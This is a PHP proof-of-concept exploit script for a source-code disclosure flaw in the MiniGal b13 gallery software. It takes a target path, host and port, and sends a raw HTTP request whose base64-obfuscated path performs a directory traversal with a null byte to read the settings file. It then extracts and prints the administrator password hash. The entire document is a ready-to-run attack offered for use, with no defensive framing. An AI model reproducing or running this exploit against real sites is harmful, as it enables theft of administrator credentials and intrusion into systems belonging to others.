&lt;?php 
set_time_limit(0);
function find_pass($data){
         $pass = explode(&#039;$adminpass = &quot;&#039;,$data);
         if($pass[1]!=&quot;&quot;){
            echo(&quot;Vuln exploited enjoy !\n&quot;);
            sleep(1);    
            echo(&quot;Admin hash == [&quot;.substr($pass[1],0,32).&quot;]\n&quot;);
         }
         else{ 
             echo(&quot;Exploit failed!!!!&quot;);
         }
}               
function __send($pack,$host,$port){
        $ret = &quot;&quot;;
        $desc = fsockopen($host,$port,$errno, $errstr, 30);
        if(!$desc){ 
           echo(&quot;Socket say:($errno).[$errstr]&quot;); 
           return;
           }
           echo(&quot;Sending payload !!\n&quot;);
           fwrite($desc,$pack);
           while(!feof($desc)){
                $ret.=fgets($desc);   
           }
        fclose($desc);  
        find_pass($ret);
        flush();
}           

echo(&quot;\n=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n&quot;.
     &quot;+       MiniGal b13 Source Code Disclosure       +\n&quot;.
     &quot;+               Alfons Luja                      +\n&quot;.
     &quot;+  --------------------------------------------  +\n&quot;.
     &quot;+       Usage poc.php path host port             +\n&quot;.
     &quot;+    ex: poc.php /press/ wwww.doda.net.pl 80     +\n&quot;.
     &quot;+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=\n&quot;);
     
if($argc&lt;3){ die(&quot;Path - host - Port - comprendo ?&quot;); }

$path = $argv[1];
$host = $argv[2];
$port = $argv[3];

$packet = &quot;GET &quot;.$path.base64_decode(&quot;aW5kZXgucGhwP2xpc3Q9Li4vc2V0dGluZ3MucGhwJTAwIEhUVFAvMS4x&quot;).&quot;\r\n&quot;;
$packet .= &quot;Host:&quot;.$host.&quot;\r\n&quot;;
$packet .= &quot;Keep-Alive: 300\r\n&quot;;
$packet .= &quot;Connection: keep-alive\r\n\r\n&quot;;
echo(&quot;\nConnecting to $host\n&quot;);
__send($packet,$host,$port);

?&gt;
